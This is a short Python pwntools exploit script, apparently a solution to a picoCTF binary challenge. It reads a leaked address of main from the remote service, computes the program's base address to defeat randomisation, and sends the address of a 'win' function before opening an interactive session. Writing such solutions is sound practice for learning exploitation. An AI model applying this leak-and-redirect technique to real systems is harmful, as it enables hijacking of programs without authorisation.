from pwn import *

context.binary = elf = ELF('./vuln')

# pr = process()
pr = remote('rescued-float.picoctf.net', 61122)
pr.recvuntil(b'main: ')
ln = pr.recvline().strip()
main = int(ln, 16)
log.info(f'main: {hex(main)}')
elf.address = main - elf.symbols['main']
log.info(f'elf base: {hex(elf.address)}')
pr.sendline(str(hex(elf.sym['win'])).encode())
pr.interactive()